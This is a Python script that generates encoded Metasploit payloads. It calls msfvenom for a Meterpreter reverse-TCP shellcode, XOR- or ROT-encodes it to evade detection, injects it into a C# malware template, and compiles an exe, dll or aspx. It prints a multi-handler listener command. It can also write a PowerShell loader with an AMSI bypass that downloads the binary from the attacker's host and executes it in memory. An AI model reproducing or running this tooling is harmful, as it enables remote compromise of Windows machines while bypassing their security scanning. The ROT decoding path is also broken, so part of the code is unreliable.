import argparse
import re
import platform
import subprocess
import random
import os

class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def auto_int(x):
    return int(x, 0)

def generatePayload():
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Msfvenom Command:{bcolors.ENDC} msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} exitfunc=thread -f csharp\n")
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
    
    if args.lhost and args.lport:
        result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "csharp"], stdout=subprocess.PIPE)
    else:
        exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Both --lhost and --lport are required when not specifying values as optional arguments.{bcolors.ENDC}")

    payload = re.search(r"{([^}]+)}", result.stdout.decode("utf-8")).group(1).replace('\n', '').split(",")

    return payload

def encodePayload(payload):
    payloadFormatted = ""
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{args.key}{bcolors.ENDC}")
    for i, byte in enumerate(payload):
        byteInt = int(byte, 16)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            byteInt = byteInt + args.key & 255
        else:
            exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid encoding type.{bcolors.ENDC}")

        payload[i] = "{0:#0{1}x}".format(byteInt, 4)

    payLen = len(payload)
    payload = re.sub("(.{65})", "\\1\n", ','.join(payload), 0, re.DOTALL)
    payloadFormatted += f"byte[] buf = new byte[{str(payLen)}] {{\n{payload.strip()}\n}};"
    #print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Payload Formatted:{bcolors.ENDC}\\n {payloadFormatted}")

    return payloadFormatted

def generateDecodingFunction():
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating decoding function for {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{args.key}{bcolors.ENDC}")
    print(f"\n{bcolors.BOLD}{bcolors.OKBLUE}[i] Decoding function:{bcolors.ENDC}")
    if args.encoding == "xor":
        decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
        {{
            buf[i] = (byte)((uint)buf[i] ^ {hex(args.key)});
        }}"""

        if args.encoding == "rot":
            decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
        {{
            buf[i] = (byte)(((uint)buf[i] - {hex(args.key)}) & 0xFF);
        }}"""

    #print(decodingFunc)
    return decodingFunc

def generate_code():
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating your malware code {bcolors.ENDC}")
    payload = generatePayload()
    payloadFormatted = encodePayload(payload)
    decodingFunc = generateDecodingFunction()
    generated_code = ""

    if not os.path.isfile(args.template):
        print(f"The file '{args.template}' not exist.")
        return

    with open(args.template, 'r') as file:
        generated_code = file.read()
        
    generated_code = generated_code.replace('$BYTE', payloadFormatted)
    generated_code = generated_code.replace('$DECODE_FUNCTION', decodingFunc)

    return generated_code

def generate_multi_handler_command():
    command = f"msfconsole -q -x 'use exploit/multi/handler;set payload {args.payload};set lhost {args.lhost};set lport {args.lport};run'"
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[+] Mutli-Handler Command:{bcolors.ENDC}")
    print(command + "\n")

def save_generated_code(updated_content):
    try:
        folder_name = f"{args.filename}-output".lower()
        file_name = f"{args.filename}.cs"
        file_path = f"{folder_name}/{file_name}"

        if not os.path.exists(folder_name):
            os.makedirs(folder_name)

        with open(file_path, 'w') as file:
            file.write(updated_content)
            print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] {file_name} saved in {folder_name}{bcolors.ENDC}")
    except Exception as e:
        exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Failed to write to the output file '{args.output}': {str(e)}{bcolors.ENDC}")
    
def generate_executable_file():
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating {args.filetype} file for {args.arch} bit{bcolors.ENDC}")
    folder_name = f"{args.filename}-output".lower()

    if args.filetype == "exe":
        command = f"mcs {folder_name}/{args.filename}.cs -unsafe -target:exe -platform:{args.arch} -out:{folder_name}/{args.filename}.{args.filetype}"
    elif args.filetype == "dll":
        command = f"mcs {folder_name}/{args.filename}.cs -unsafe -target:library -platform:{args.arch} -out:{folder_name}/{args.filename}.{args.filetype}"
    elif args.filetype == "aspx":
        command = f"mv {folder_name}/{args.filename}.cs {folder_name}/{args.filename}.{args.filetype}"
    try:
        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output, error = process.communicate()

        print(f"Output: \n {output}")
        print(f"Errors: \n {error}")
        
        if process.returncode == 0:
            print(f"File {args.filename} created")
        else:
            print(f"Error during process.Exit Code: {process.returncode}")

    except Exception as e:
        print(f"Error: {str(e)}")


def generate_in_memory_file_loader():
    folder_name = f"{args.filename}-output".lower()
    file = f"{folder_name}/{args.filename}.cs"
    method = ""

    with open(file, 'r') as file:
        file_content = file.read()
        namespace_match = re.search(r'namespace\s+(\w+)', file_content)
        namespace_name = namespace_match.group(1) if namespace_match else None

        class_match = re.search(r'class\s+(\w+)', file_content)
        class_name = class_match.group(1) if class_match else None

        amsi_bypass = """$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)"""
        
        if args.filetype == "exe":
            method = 'Main'
        elif args.filetype == "dll":
            method = 'Run'
        
        loader = f"""{amsi_bypass}
$data = (New-Object System.Net.WebClient).DownloadData('http://{args.lhost}:80/{args.filename}.{args.filetype}')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("{namespace_name}.{class_name}")
$method = $class.GetMethod("{method}")
$method.Invoke(0, $null)
        """

        try:
            file_name = "run.txt"
            file_path = f"{folder_name}/{file_name}"

            if not os.path.exists(folder_name):
                os.makedirs(folder_name)

            with open(file_path, 'w') as file:
                file.write(loader)
                print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] {file_name} saved in {folder_name}{bcolors.ENDC}")
        except Exception as e:
            exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Failed to write to the output file '{args.output}': {str(e)}{bcolors.ENDC}")

def main():
    if platform.system() != "Linux":
        exit("[x] ERROR: Only Linux is supported for this utility script.")

    generated_code = generate_code()
    generate_multi_handler_command()
    save_generated_code(generated_code)
    generate_executable_file()

    if args.createInMemoryFileLoader:
        generate_in_memory_file_loader()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--lhost", help="listener IP to use (optional)")
    parser.add_argument("--lport", help="listener port to use (optional)")
    parser.add_argument("--encoding", help="the encoding type to use ('xor' or 'rot')", default="xor")
    parser.add_argument("--key", help="the key to encode the payload with (integer)", type=auto_int, default=random.randrange(1, 256))
    parser.add_argument("--payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_tcp)", default="windows/x64/meterpreter/reverse_tcp")
    parser.add_argument('--arch', choices=['x86', 'x64'], help="Select the architecture for code")
    parser.add_argument("--filetype", choices=['exe', 'dll', 'aspx'], required=True, help="Select file type")
    parser.add_argument("--filename", help="Your executable file name without extension Ex. ProcessHollowing")
    parser.add_argument("--template", help="template malware Ex. './ProcessHollowingExe.cs'", required=True)
    parser.add_argument("--createInMemoryFileLoader", action=argparse.BooleanOptionalAction, default=False, help="Create a file to load assembly file in memory")
    args = parser.parse_args()
    main()